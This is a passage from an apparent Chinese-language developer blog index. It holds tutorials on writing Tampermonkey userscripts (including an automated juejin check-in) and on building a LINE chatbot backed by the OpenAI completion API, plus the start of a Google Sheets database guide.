Tools、Vue.js devtools。 notifications：瀏覽器通知，未打開頁面的情況下進行通知，可以輔助一些工具類應用。 storage：全局保存數據，可跟隨瀏覽器帳戶同步。 這裡例舉的只是我常用的一些，只是滄海一粟，更多 API 可以查閱：\nChrome Extension API Reference 支持用於擴展Microsoft Edge API Mozilla WebExtensions API 瀏覽器插件就簡單介紹到這裡，如果有興趣繼續了解，推薦：Chrome、Edge、Mozilla三家的文檔。\n油猴插件(Tampermonkey) 瀏覽器插件可以實現各式各樣的功能，但有時候開發者只是想對某一個站點加一點點小功能，如果這也要構建環境打包上架分發，未免就太麻煩了一些；從應用市場角度來看，充斥著顆粒化的應用，市場也會擁擠繁雜不堪。\n油猴插件為輕量化腳本提供了一個平台，在線編輯器中編寫油猴腳本即時生效，通過 Github、GreasyFork 快速分發。\n在油猴插件中，content script 起到非常重要的角色，它將用戶編寫的代碼運行在頁面中，同時提供 GM_xxxx 函數封裝瀏覽器的部分能力。封裝的內部實現是和 background script 通信，驅動 background script 調用插件API。\n對油猴插件簡單了解之後，來看看如何編寫油猴腳本。\nTampermonkey API 油猴腳本由頭部和核心邏輯兩部分組成。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // ==UserScript== // @name New Userscript // @namespace http://tampermonkey.net/ // @version 0.1 // @description try to take over the world! // @author You // @match https://www.tampermonkey.net/documentation.php?ext=dhdg // @icon https://www.google.com/s2/favicons?domain=tampermonkey.net // @grant none // ==/UserScript== (function() { \u0026#39;use strict\u0026#39;; // Your code here... })(); 頭部 頭部是腳本的一些元信息、更新方式、指定運行頁面、權限聲明，逐一解釋一下：\n配置名 作用 使用技巧 @name 腳本顯示的名稱 加後綴實現國際化，例如：@name:zh-CN 指定在瀏覽器語言為中文時顯示的名稱 @namespace 腳本的命名空間，可以理解為腳本的標識 為了避免衝突一般使用 Github 倉庫地址 @version 與更新相關，當前版本 @updateURL 檢查腳本是否更新地址 配合 @version 和自動更新使用 @downloadURL 檢測到更新時，去哪下載腳本 @supportURL 遇到問題時，用戶去哪反饋 @include 腳本在哪些頁面運行 可使用正則，不支持 hashtag，多個頁面的地址聲明多個 @include 即可 @match 與 @include 類似 @exclude 腳本禁止在哪些頁面運行，優先於 @include @require 在腳本運行前引入外部 JavaScript 文件 例如：引入 jQuery @resource 聲明外部資源文件，搭配 GM_getResourceText 使用 例如：引入 html、icon @connect 聲明 GM_xmlhttpRequest 可訪問的域 必須指定才能正常請求 @grant 聲明 GM_xxx 函數的使用列表 必須先指定權限才能正常使用 @run-at 指定腳本運行時機 document-start：盡快執行document-body：當 body 掛載時執行document-end：DOMContentLoaded 觸發時執行document-idle：DOMContentLoaded 觸發後執行，也是默認設置項context-menu: 右鍵菜單項被點擊時執行 @author 作者名 @description 簡短介紹 同樣可以加後綴實現國際化，例如：@description:zh-CN @homepage 主頁地址 如果未設置並且 @namespace 是倉庫地址，默認導向倉庫地址 @icon 腳本 icon @icon64 64x64 像素的腳本 icon @antifeature 腳本是否有廣告、挖礦、數據收集等商業行為 @noframes 聲明腳本不在 iframe 中運行 核心邏輯 核心邏輯通過一個立即執行函數包裹，避免和全局作用域相互干擾。Tampermonkey 將瀏覽器的部分能力封裝為 GM_XXX 函數以供調用：\nAPI 作用 使用技巧 unsafeWindow 訪問頁面的 Window 對象 GM_addStyle(css) 創建全局樣式的快捷方式，向頁面插入 style 元素 也可以用 DOM 操作手動創建 GM_addElement(tag_name, attributes)GM_addElement(parent_node, tag_name, attributes) 向 DOM 新建元素的快捷方式 也可以用 DOM 操作手動創建 GM_log(message) 在 Console 中打印信息 console.log 的快捷方式 GM_getValue(name, defaultValue) 從存儲體中獲取數據 GM_deleteValue(name) 從存儲體中刪除數據 GM_listValues() 列舉存儲體中所有數據項 GM_addValueChangeListener 監聽數據更新 例如要使 Tab 間數據同步，可以用監聽 value 達成同步 GM_removeValueChangeListener 移除監聽 GM_getResourceText(name) 獲取 @resource 中已聲明的資源 GM_getResourceURL(name) 獲取 @resource 中已聲明的資源(base64 URI 形式) GM_registerMenuCommand(name, fn, accessKey) 在 Tampermonkey 的 popup 中增加選項 GM_unregisterMenuCommand(menuCmdId) 移除選項 GM_openInTab(url, options) 新開一個 tab 頁 GM_xmlhttpRequest(details) 使用後台腳本進行請求，自動帶上 cookie，無跨域問題，目標域需要在 @connect 中提前聲明 GM_download(details) 下載資源到本地 GM_getTab(callback) 獲取當前 tab 的 object 對象 GM_saveTab(tab) 通過 tab 的 object 對象重新打開一個 tab GM_getTabs(callback) 獲取當前存活的所有 tab 的對象，以便和其他腳本實例溝通 GM_notification 使用插件 notification API 彈出桌面通知 GM_setClipboard 複製內容到剪貼板 GM_info 獲取腳本的油猴插件的信息 完整的說明文檔：Tampermonkey documentation\n實踐：打印 \u0026ldquo;Hello, World\u0026rdquo; 做一個非常簡單的小練習：創建一個名為 \u0026ldquo;Hello\u0026rdquo; 的腳本，當進入掘金和知乎頁面時，在 Console 中打印 \u0026ldquo;Hello, World\u0026rdquo;。\n新建腳本 修改腳本名稱 指定運行地址 @match 或 @include 直接使用 console.log 或者聲明權限調用 GM_log 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // ==UserScript== // @name Hello // @namespace http://tampermonkey.net/hello // @version 0.1 // @description try to take over the world! // @author You Name // @match https://zhihu.com/* // @match https://juejin.cn/* // @grant GM_log // ==/UserScript== (function() { \u0026#39;use strict\u0026#39;; GM_log(\u0026#34;Hello World\u0026#34;); })(); 搭建舒適的開發環境 使用在線編輯器小試牛刀之後，或許你也發現在線編輯器：\n缺少語法補全和自動提示 難以格式化代碼 不免懷念起 VSCode。\n或許你還會有更深遠的考慮，在線編輯器編輯完成後：\n怎麼同步到遠程倉庫，怎麼做代碼分發 如果要用到新語法，怎麼保證跨瀏覽器兼容性 如果代碼越寫越多，沒有模塊化怎麼管理 沒有 TS，很難保證長期維護 這些坑我已經踩過了，並且抽出一個腳手架工具 create-tampermonkey - npm (npmjs.com)，一鍵搭建舒適的油猴腳本開發環境。\n腳手架集成 rollup + babel + eslint + typescript，支持：\n自動生成 UserScript Header 語法和類型系統：ESNext、ES Module、TypeScript 樣式系統：CSS Modules，以及 scss、sass、less、stylus (需安裝對應依賴) 靜態資源：導入圖片、SVG 轉換為 Base64，同時支持 SVG Sprite 多語言 擴展：基於 Rollup，可以按需安裝插件進行擴展 create-tampermonkey 啟動項目 初始化項目 1 2 3 4 5 npx create-tampermonkey demo-userscript # 或者 npm init tampermonkey demo-userscript # 或者 yarn create tampermonkey demo-userscript 初始化完畢後，進入目錄安裝依賴。 1 npm run dev # 跑起開發模式 到瀏覽器中打開 dev.user.js，自動進入 Tampermonkey 腳本安裝界面。 最後一步：配置油猴插件 訪問 chrome://extension，找到油猴插件的卡片，點擊 Details 進入配置界面。\n勾選 Allow acess to file URLs。\n刷新頁面，出現彈窗，一切就緒。\n用 VSCode 打開項目，這時右下角會推薦一些輔助插件，建議安裝。\n代碼中使用到的 GM_xxx 會自動提取到 UserScript Header 中，當然也可以在 src/meta.json 中自定義。\n代碼的默認入口是 src/main.js 文件。\n實踐：掘金簽到功能 基於上面初始化的項目 demo-userscript 做一個小功能：掘金簽到功能。\n定位請求 \u0026ldquo;掘金簽到\u0026quot;本質是調用接口，我們的實現思路是追踪點擊\u0026quot;立即簽到\u0026quot;按鈕時請求發送情況，定位到\n調試接口 打開 Postman 做一下調試，這裡有一個導入小技巧：右鍵拷貝 cURL。\n到 Postman 中通過 curl 導入整個請求：點擊左側面板中的 import 按鈕，選擇 Raw text 貼上上一步複製的內容即可。\n獲取參數 在 Postman 中發現請求需要 aid、uuid、_signature 三個參數，試試看不帶參數能否請求成功，先確定好必不可少的參數和請求頭。\n簡單嘗試後，發現這裡並不需要帶 aid、uuid、_signature 三個參數，主要是依賴 cookie，使用 GM_xmlhttpRequest 會自動帶上對應的 cookie，事情變得簡單。\n修改 src/main.js 的代碼：\nsrc/main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 GM_xmlhttpRequest({ url: \u0026#34;https://api.juejin.cn/growth_api/v1/check_in\u0026#34;, method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;content-type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;user-agent\u0026#34;: navigator.userAgent, }, responseType: \u0026#34;json\u0026#34;, onload(response) { if (response.status === 200) { const data = response.response; if (data.data === \u0026#34;success\u0026#34;) { alert(\u0026#34;簽到成功\u0026#34;); } else { alert(data.err_msg); } } }, }); 刷新頁面測試一下。在其他站點刷新一下居然也可以發送請求，這就是插件沒有跨域限制的優勢了。\n再做一下節流優化。利用 GM_setValue 和 GM_getValue 做持續存儲。\nsrc/main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 const storageKey = \u0026#34;last_sign_timestamp\u0026#34;; // 取得上一次簽到的日子 const lastSignNumberOfDays = GM_getValue(storageKey, 0); // 計算現在所在的日子 const currentNumberOfDays = Math.floor( new Date().valueOf() / 1000 / 60 / 60 / 24 ); // 如果今天已经請求過，不再請求 if (currentNumberOfDays !== lastSignNumberOfDays) { GM_xmlhttpRequest({ url: \u0026#34;https://api.juejin.cn/growth_api/v1/check_in\u0026#34;, method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;content-type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;user-agent\u0026#34;: navigator.userAgent, }, responseType: \u0026#34;json\u0026#34;, onload(response) { if (response.status === 200) { const data = response.response; if (data.data === \u0026#34;success\u0026#34;) { alert(\u0026#34;簽到成功\u0026#34;); } else { alert(data.err_msg); } // 更新最近一次簽到的日子 GM_setValue(storageKey, currentNumberOfDays); } }, }); } 難免會遇到需要獲取數據的情況，可訪問的數據一般有三種：\n頁面中包含數據，通過DOM 獲取 通過接口請求得到 存儲在本地存儲中，localStorage 或 cookie 之類 確定方式很粗暴：\n複製參數或參數值到Element 中搜索 查看前面幾個請求，看看是否有跡可循 到 localStorage 或 cookie 中搜索 發布腳本 在本地開發完腳本之後，npm run build 構建生產版本並上傳代碼到 Github 或 Gitee。\n用 Github/Gitee 上文件的 Raw URL 就能直接實現分發。如果在 package.json 中設置好 repository，create-tampermonkey 會自動生成 Raw URL 並賦給 downloadURL、updateURL。\n但這樣分發存在的問題是無法統計下載量、從網絡訪問的角度考慮同時維護 Github 和 Gitee 兩個倉庫。\n另一種分發方式是上傳到腳本平台 greasyfork.org/，登錄後即可發布新腳本，如果代碼託管在 Github 或 GitLab 還可以使用 Webhooks 實現自動更新。\n開發技巧 調試油猴腳本 油猴腳本的運行依託於 background script 和 content script，在調試前需要對運行環境有所區分，例如 GM_xmlhttpRequest 請求是 background script 發出的，DOM 處理和腳本邏輯是 content script 執行的。\n確定環境之後，就可以使用對應的調試方式進行調試了。\n調試 background script 還是訪問 chrome://extension，找到油猴插件的卡片：\ninspect views 後面有個 background.html，點擊一下彈出 background script 的調試彈窗。\n調試 content script 在網頁inspect -\u0026gt; Sources -\u0026gt; Page 下找到 Tampermonkey 目錄，頁面中運行的油猴腳本代碼都在這了，選擇目標，斷點調試即可。\n獲取 userId 等信息 有時候需要拿一些額外信息做請求，一般有三種方式：\n看看能不能在頁面中搜索到，通過 DOM 獲取 看看有沒有接口可以調用獲取 看看本地存儲裡有沒有 目標 DOM 節點未掛載怎麼辦？ 如果節點是在首屏加載的，粗暴的方法是使用 setTimeout 做一下延時。\n但如果是在交互過程中有DOM 更新，就只能引入監聽機制了，使用 MutationObserver 來實現。\n具體的實例可以看【開發記錄】掘金\u0026quot;破圈行動\u0026rdquo; 輔助腳本- 掘金(juejin.cn)\n查看插件源碼 瀏覽器插件安裝之後，插件包被下載到本地目錄中，可通過下述方法訪問。\n訪問 chrome://version，找到 Profile path(存放用戶數據的路徑)\n訪問 chrome://extensions/，找到目標插件的ID\n將 Profile Path 和插件 ID 拼裝在一起 ${Prifile Path}/Extensions/${Extension Id}，便是插件包的路徑了。友情提示，通過命令行訪問時需要在空格前加個 \\ 轉義一下。\n總結 瀏覽器插件利用瀏覽器能力進行功能擴展，具有跨域請求、讀取 cookie、管理歷史記錄、註冊右鍵項等能力。\n瀏覽器插件的能力很豐富，能夠實現複雜的功能。但如果只是做一些針對頁面的操作，只需要依賴基礎能力，完全可以使用油猴腳本實現，開發更便捷分發更迅速。\n開發油猴腳本，主要是使用 Tampermonkey API 和 JavaScript。\ncreate-tampermonkey 腳手架提供一個全面的油猴腳本開發環境，依托這個環境，可以使用最新的 ES 語法、TypeScript、CSS Modules，在 VSCode 中進行模塊化開發，大大提高開發效率。\n開發完畢的油猴腳本可通過 Github/Gitee Raw URL 或 Greasy Fork 平台分發。\n瀏覽器插件的主要分工為 background script 和 content script 兩部分，在調試油猴腳本時需要思考清楚是哪一部分出現的問題，再採用對應的調試方式。\n實現了兩個小實踐，走出第一步，接下來盡情發揮創造力吧，玩得開心～\n最後分享一下我的 Tampermonkey UserScripts 清單，持續更新，需要的歡迎下載來使用！\n","date":"2022-12-15T00:00:00Z","image":"https://live.staticflickr.com/65535/52564977913_09952966be_o.jpg","permalink":"https://wayneblog.ga/2022-12-15/tampermonkey-userscript-tutorial/","title":"【Tampermonkey】輕鬆上手 - 油猴腳本開發"},{"content":" 參考網站\n參考網站\n最近 OpenAI 的 ChatGPT 非常的火紅，剛好這個 ChatGPT 是有提供 API 可以串接的，也非常適合整合到 Line Bot 上，所以這一篇我就來介紹如何使用 Node.js 基於 OpenAI 的 ChatGPT API 來建立一個 Line 聊天機器人吧！\n申請 OpenAI API 首先，請你先進入 OpenAI 的網站註冊會員，這邊你可以選擇第三方服務帳號(如：Google、Microsoft)或是 Email 帳號註冊。\n註冊完後，你就可以開始申請 API 了！\n如果你本身有帳號的話，那就直接登入 OpenAI 吧。\n登入後，你應該會看到這個畫面\n接著找到你的頭像點它，找到「View API keys」。\n找到後你會看到「API keys」的申請畫面，點一下下方的「Create New Secret key」，這樣你就拿到串接 OpenAI 的 key，請先把它記下來，後面會用到。\nAPI key generated 是非常重要的，因此請不要隨意提供給他人，以免造成不必要的損失。\n那麼我們申請這個是 API Key 要幹嘛呢？主要是稍後後面會串接 OpenAI 所提供的 API 來使用 ChatGPT，如果你還不知道什麼是 ChatGPT 的話，你可以試著玩一下 ChatGPT，簡單來講 ChatGPT 是一個非常聰明且厲害的聊天機器人，它可以做到的事情非常多，例如像是\u0026hellip;\n請它規劃日本旅遊行程 寫一篇行銷文案 幫忙找出程式碼錯誤 程式碼解題 \u0026hellip;等等，非常多\n因此我們申請這個 API Key 就是用來串接 ChatGPT 的！\nOpenAI 本身有提供免費的額度，三個月 18 美金，除此之外，OpenAI 的計算方式會因你使用的 model 不同而有不同的計算方式，例如像是「Davinci」的計算方式是 $0.0200(美金) / 1K tokens，如果你想要了解更多的話，可以參考這邊。\n額外補充\n什麼是 tokens？\ntokens 是指你輸入的字數，例如：「我想要去日本旅遊」，這句話有 8 個字，因此 tokens 就是 8。\n申請 Line Developer 接下來我們要來申請 Line Developer 帳號，你可以透過這個連結快速進入 Line Developer 網站，登入方式，基本上就是使用 LINE 帳號登入。\n登入後，你可以透過這個連結，進入 LINE 的開發者後台。\n接著，你會看到畫面上什麼都沒有，所以這邊你要點一下中間的「Create a new provider」，這個類似於一個公司帳號的概念，底下會有許多的專案，所以你可以把它想像成一個公司，而這個公司底下有許多的專案，例如：Line Bot、Line MUSIC 等等之類你的服務。\n這邊的話，範例我們就叫做「Wayne\u0026rsquo;s OpenAI Bot」。\n建立的過程是非常快的，因此當你點下「Create」 之後，你就可以馬上看到 Wayne\u0026rsquo;s OpenAI Bot 的畫面。\n接著，點一下畫面上的 「Create a Messaging API channel」，因為我們要來申請一個聊天機器人，所以我們要使用「Messaging API」。\n進入「Create a Messaging API channel」後，會有一些欄位要填寫：\nChannel type： 保持預設 Messages API。 Provider： 保持預設 「Wayne\u0026rsquo;s OpenAI Bot」 即可。 Company or owner’s country or region： 依據你的公司所在地選擇，這邊我選擇台灣。 Channel icon： 你可以之後再上傳，所以這邊先不用管。 Channel name： 這邊我們就叫「Wayne\u0026rsquo;s AI」吧。 Channel description： 你可以簡單描述一下，這個聊天機器人的功能，例如：「用於串接 OpenAI 的偉恩 Line 機器人」。 Category： 就選擇…「其他媒體」。 Subcategory： 接著一樣選「媒體（其他）」。 Email address： 這是當你的聊天機器人有問題時，信箱聯絡你的方式。 Privacy policy URL 與 Terms of use URL： 這兩個就不用理它，因為我們目前用不到。。 最後再打勾兩個條管，你就可以點下「Create」建立你的聊天機器人了。\n由於這個頁面圖片太大張了，所以就不額外截圖。\n當你按下「Create」之後，它會出現一個視窗，主要是告知你一些資訊，所以你可以按下 OK 關閉它。\n到目前為止，我們只是申請好了一個 Line Bot，接著要來取得一些資訊，首先在「Base settings」中找到以下資訊並複製起來。\nChannel ID Channel secret 接著切換到「Messaging API」，找到「Channel access token」。\n接著按下 「issue」，你會取得一串很長的 Token，請複製起來，後面我們會使用到。\n到目前為止，我們已經準備好了 Line Bot 的申請以及 OpenAI API 的申請，接下來就是準備進入撰寫程式碼的部分囉。\n建立一個專案 建立專案方式我就不多述了，相信大家應該都很熟悉怎麼建立專案以及安裝 Node.js，而這邊我稍微會有一點特別，我會使用 pnpm 來建立，如果你真的完全沒想法，你可以參考我以下指令來建立一個專案，當然你也可以使用 npm 或是 yarn 來建立。\n提示：以下指令適用於 Mac 系統，若為 Mac 建議額外 Google 一下指令。\n1 2 3 4 5 6 7 8 9 10 11 # 若尚未安裝pnpm，可使用此指令先進行安裝 # npm install -g pnpm # 建立一個資料夾 mkdir line-bot # 進入資料夾 cd line-bot # 初始化專案 pnpm init 基本上到這邊就算是初始化好一個專案了，接著就是準備要來安裝 Line Bot 的套件了。\n安裝相關套件 接下來我們要安裝 @line/bot-sdk 這個套件，請在專案終端機下輸入以下：\n1 pnpm i @line/bot-sdk express dotenv 安裝好之後，你可以先在專案底下建立一個 app.js 的檔案，稍後我們就會開始撰寫 LINE Bot 的程式碼囉。\n撰寫 LINE Bot 前面我們已經準備好了 app.js 檔案，接著就是要撰寫程式碼，不外乎前面就是引入 @line/bot-sdk、express 與 dotenv 這三個套件。\napp.js 1 2 3 4 require(\u0026#39;dotenv\u0026#39;).config(); const express = require(\u0026#39;express\u0026#39;); const line = require(\u0026#39;@line/bot-sdk\u0026#39;); 接著呢？其實 Line 官方有提供範例程式碼，因此我們是可以直接嘗試挪過來測試看看。\napp.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 require(\u0026#39;dotenv\u0026#39;).config(); const line = require(\u0026#39;@line/bot-sdk\u0026#39;); const express = require(\u0026#39;express\u0026#39;); // create LINE SDK config from env variables const config = { channelAccessToken: process.env.CHANNEL_ACCESS_TOKEN, channelSecret: process.env.CHANNEL_SECRET, }; // create LINE SDK client const client = new line.Client(config); // create Express app // about Express itself: https://expressjs.com/ const app = express(); // register a webhook handler with middleware // about the middleware, please refer to doc app.post(\u0026#39;/callback\u0026#39;, line.middleware(config), (req, res) =\u0026gt; { Promise .all(req.body.events.map(handleEvent)) .then((result) =\u0026gt; res.json(result)) .catch((err) =\u0026gt; { console.error(err); res.status(500).end(); }); }); // event handler function handleEvent(event) { if (event.type !== \u0026#39;message\u0026#39; || event.message.type !== \u0026#39;text\u0026#39;) { // ignore non-text-message event return Promise.resolve(null); } // create a echoing text message const echo = { type: \u0026#39;text\u0026#39;, text: event.message.text }; // use reply API return client.replyMessage(event.replyToken, echo); } // listen on port const port = process.env.PORT || 3000; app.listen(port, () =\u0026gt; { console.log(`listening on ${port}`); }); 記得在專案底下建立一個 .env 並填寫以下資訊跟 Key。\n1 2 CHANNEL_ACCESS_TOKEN= CHANNEL_SECRET= 理論上來講，你目前專案應該是已經可以輸入 node app.js 啟動了，所以你可以嘗試啟動看看，如果無法啟動的話，會建議你往前面的步驟再檢查一下。\n部屬到 Render 到目前為止我們要先嘗試將專案部署到 Render 上面，否則我們並不清楚專案是否可以正常運作，因為在使用 Render 之前，我們需要先建立一個 Render 的帳號，如果你還沒有的話，可以先到這邊註冊一個帳號。\n建立好後，會建議你將專案程式碼上傳到 GitHub 上，因為 Render 有提供 GitHub 的整合，這樣可以讓我們更方便的部署專案，而上傳到 GitHub 這流程就不再贅述了，因此我這邊假使你已經完成了將程式碼上傳到 GitHub 這個動作後，接著就是直接進入到 Render 後台。\n這邊請選擇 「Web Services」。\n接著你可以在這個畫面上選擇專案，如果你發現你的畫面上一個專案都沒有的話，可以點一下旁邊的「Configure account」。\n接著你可以在這邊選擇專案，懶一點的話你可以乾脆給它全部的權限，因為我們只是要部署一個簡單的專案，所以我就選擇我要的單一專案即可。\n接下來畫面上應該就可以看到你的專案了，接著點選你要部署的專案。\n在這邊點一下「Connect」。\n這邊會要求你填一些欄位，我就不多說明了，我直接附上我的設定。\n接著往下滾，就選擇 「Free」專案即可，然後再點一下下方的「Advanced」。\n因為我們要在「Advanced」區塊填入環境變數。\n接著點一下「Add Environment Variable」，依照欄位填入。\n最後其他設定可以不用管，直接點一下最後的「Create Web Service」。\n預設 Render 會去偵測 Commit 紀錄，所以如果有新的 Commit，Render 會自動重新部署，如果你不想要這個功能的話，可以在「Advanced」區塊裡面，將「Auto Deploy」關閉。\n那麼由於為了方便示範，因此我這邊預設會採用「Yes」。\n接著你就可以看到你的專案正在部署了。\n這個過程稍微會比較久一點，因為 Render 會將它打包成一個 Docker Image，然後再部署到它的伺服器上，所以這個過程會稍微比較久一點，但是不用擔心，因為它會自動幫你做這些事情，你只要等待它完成即可。\n部署完畢的話，你可以在畫面看到他提示你專案已經運行起來並且開始部署。\n而你的專案的網址，就會在這邊：\n不出意外的話，應該是無法開啟的，因為我們只有做一個 post 的 API，那麼到這邊我們專案就正式部署出去了，基本上都不用理會它了。\n這邊請記住網址，因為後面我們會在使用到。\n加入 Line Bot 好友 接下來我們就要來實際測試一下，我們的 Line Bot 是否可以正常運作，而取得這個 LINE Bot 的 ID 方式就在 Developer Console 的「Messaging API」裡面。\n加入好友後，你應該就會立刻看到好友歡迎的訊息通知。\n接著你可以試著發送訊息給它，例如「Test」，但是你會發現它沒有辦法正常回應你。\n因此接下來，我們要做一點調整，讓它可以正常回應你。\n調整 Line Bot 這邊請你回到 Line Bot 的後台，點一下「Messaging API」，然後找到「Webhook settings」。\n接著點一下「Edit」，然後將「Webhook URL」填入你的專案網址，例如 https://example.com/callback\ncallback 是因為我們 Express 專案的路由是 /callback，如果你的路由不是這個的話，請自行修改。\napp.js 按下儲存後，你可以點一下「Verify」，來驗證你的網址是否正確以及專案是否正常，只要能看到「Success」就代表你的網址以及專案是正確的。\n接著將下方的 「Use webhook」打開。\n打開後，你再去試著發送訊息給你的 Line Bot，你就會發現它可以正常回應你了，而且是不論你打什麼，他都會回應你剛剛打的字。\n恭喜你，截至為止，我們終於把 Line Bot 正式處理好了。\n關掉預設回饋 接下來你可能會想要把那段該死的提示回饋：\n1 2 3 4 感謝您的訊息！ 很抱歉，本帳號無法個別回覆用戶的訊息。 敬請期待我們下次發送的內容喔(moon smile) 以及加入好友通知：\n1 2 3 4 5 6 XXX您好！ 我是Wayne\\\u0026#39;s AI。 感謝您加入好友 此官方帳號將定期發放最新資訊給您 敬請期待 這兩個關掉，關掉方式很簡單，一樣回到 Line Bot 的後台，點一下「Messaging API」，然後找到「Auto-reply messages」。\n你會跳到 LINE@ 管理介面，將「加入好友歡迎訊息」以及「自動回覆訊息」關掉就搞定囉！\n串接 OpenAI API 終於到了我們的重頭戲了，前面你可以發現 LINE Bot 的流程與申請非常的多且繁瑣，因此前面花很多時間在介紹，主要是希望你可以順利建立好你的 LINE Bot，確保你接下來的步驟不會有問題。\n安裝 OpenAI 套件 首先我們要先安裝 OpenAI 的套件，請在專案底下輸入以下指令：\n1 pnpm i openai 接著 openai 本身有提供範例程式碼：\n1 2 3 4 5 6 7 8 9 10 11 12 const { Configuration, OpenAIApi } = require(\u0026#34;openai\u0026#34;); const configuration = new Configuration({ apiKey: process.env.OPENAI_API_KEY, }); const openai = new OpenAIApi(configuration); const completion = await openai.createCompletion({ model: \u0026#34;text-davinci-002\u0026#34;, prompt: \u0026#34;Hello world\u0026#34;, }); console.log(completion.data.choices[0].text); 因此基於上方這一段，我們稍候可以來修改一下，讓它可以跟我們的 LINE Bot 串接。\nopenAI 有提供多個 model 可以選擇，分別是：\ntext-davinci-003 text-curie-001 text-babbage-001 text-ada-001 其中目前(2022年)最紅的就是 text-davinci-003，因此我們這邊也會使用這個 model，每一個 model 都有不同的特性，你可以在這裡找到它的介紹。\n調整 app.js 的程式碼 首先我們要先在 app.js 中引入 OpenAI 的套件。\napp.js 1 const { Configuration, OpenAIApi } = require(\u0026#34;openai\u0026#34;); 接下來我們要來實例化 OpenAI。\napp.js 1 2 3 4 const configuration = new Configuration({ apiKey: process.env.OPENAI_API_KEY, }); const openai = new OpenAIApi(configuration); apiKey 就是我們最早前面所申請的 OpenAI API Key，而這一段一樣是放在 .env 的。\n如果你沒申請的話你會無法往下繼續的，請務必申請 OpenAI API Key 唷。\n目前來講，你的 .env 應該長這樣：\n1 2 3 4 CHANNEL_ACCESS_TOKEN= CHANNEL_SECRET= OPENAI_API_KEY= 接下來呢？我們就要將原本 Line 官方所提供的範例程式碼稍微調整一下，主要調整的範圍是 handleEvent 的程式碼：\napp.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 async function handleEvent(event) { if (event.type !== \u0026#39;message\u0026#39; || event.message.type !== \u0026#39;text\u0026#39;) { // ignore non-text-message event return Promise.resolve(null); } const completion = await openai.createCompletion({ model: \u0026#34;text-davinci-003\u0026#34;, prompt: event.message.text , }); // create a echoing text message const echo = { type: \u0026#39;text\u0026#39;, text: completion.data.choices[0].text }; // use reply API return client.replyMessage(event.replyToken, echo); } 這邊我們將原本的 prompt 改成 event.message.text，也就是使用者輸入的訊息，而 completion.data.choices[0].text 就是 OpenAI 所回傳的訊息。\n沒問題後就儲存檔案，並 commit push 出去到 GitHub 上，屆時 Render 就會自動幫你重新部署了。\n記得要去 Render 上面增加 OPENAI_API_KEY 的環境變數，否則會出現錯誤唷。\n當部署完畢後，你再去試著跟你的 LINE Bot 聊天，你會發現它已經會講話囉！\n只是你會發現它好像沒辦法回你很多話，這原因是我們沒有告知它要使用多少 Tokens，因此這邊我們調整一下：\napp.js 1 2 3 4 5 const completion = await openai.createCompletion({ model: \u0026#34;text-davinci-003\u0026#34;, prompt: event.message.text, max_tokens: 200, }); 這個 max_tokens 會影響到 OpenAI 所回傳的訊息長度，因此我們這邊設定為200，這樣就可以讓它回很多話了。\n調整 OpenAI 的回傳訊息 那麼這邊也有一件很有趣的事情，也就是 OpenAI 的訊息都有一大推空白，這是因為 OpenAI 會將你的訊息分成一個個的段落，而每個段落之間都會有一個空白，因此我們也要來調整一下。\napp.js 1 2 3 4 5 6 7 const completion = await openai.createCompletion({ model: \u0026#34;text-davinci-003\u0026#34;, prompt: event.message.text , max_tokens: 200, }); const echo = { type: \u0026#39;text\u0026#39;, text: completion.data.choices[0].text.trim() }; 再重新上傳程式碼後，你就可以看到機器人正常的回你了。\n恭喜你，完成了一個可以跟你聊天的機器人！而且是串接了 OpenAI 的機器人！\n結語 相信你應該發現這個 Line Bot 的建立流程超級無敵的長，而且非常的多流程跟細節，但是你也可以因此認識到如何串接第三方服務，以及如何將你的程式碼部署到 Render 上面，所以我覺得是一個相當不錯的小練習，所以如果你想嘗試做一個聊天機器人，是可以考慮使用這個方法的。\n但是要注意一件事情 OpenAI 的 GPT 有一個重點使用，如果你要讓你聰明一點的回覆你，那麼你就要將它的上下文（包含你的回覆）一起撈出來丟給它，否則你會發現它有點笨，可是 LINE 的聊天機器人不太適合這種方式，因為過程你可能會問很多事情，這樣子訊息量會非常龐大且沒辦法刪除，因此這邊我們就不做這件事情了，而是讓它針對你每個問題去回覆即可，而不包含前一個問題的回覆。\n最後這邊我也附上範例程式碼，如果你想直接拉回去用也是可以的，因為這一份程式碼基本上都是以官方所提供的為主，很少有大幅度調整的部分，所以你可以直接拿來用。\n希望這一篇可以讓你快快樂樂做出一個 LINE Bot。\n如果你覺得部署到 Render 很難去除錯，其實是可以考慮使用 ngrok 的，ngrok 的使用方法可以參考這裡。\n","date":"2022-12-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52558908513_206844d03c_o.png","permalink":"https://wayneblog.ga/2022-12-12/nodejs-create-openai-line-bot/","title":"用 Node.js 建立你的第一個 OpenAI LINE Bot 聊天機器人"},{"content":" 參考網站\nGoogle 試算表名稱是 Google Sheets，但為了讓大家好理解，以下也會稱 Google Excel。\n這一篇說明如何把 Google Excel 當作資料庫，並實作出一個簡單的會員列表頁出來。\n建立 Google Excel 在 Google Drive 上，按新增，選擇「Google 試算表」，就會進到一張新的 Google Excel。\n這邊設定的假資料欄位，總共有以下 5 個：\nid：流水號 name：姓名 image：圖片 email：信箱 phone：電話 要注意，欄位名稱的部份要用英文，在下面接資料那段會解釋原因。\nDemo 的資料如下：\n發佈 Google Excel 到網路 這步最簡單也最重要，只有選擇發佈到網路上的 Google Excel，才能 GET 到資料。\n首先，點擊左上角的「檔案」\u0026gt;「共用」，會看到展開的選項裡有「發佈到網路」：\n點擊後，會出現詢問框，問說發佈的範圍：\n這篇 Demo 因為只有一張表，所以直接用「整份文件」，如果是有很多張表，但限制其中幾張是可以抓的，就選擇可以公開的表即可。\n按下「發佈」後，就會看見結果的詢問框：\n就可以按下叉叉關掉這框了。\n接著記得將表單的「檢視」權限開放給知道連結的任何人，以免後面步驟因權限不足而被阻擋。\n取得 Google API 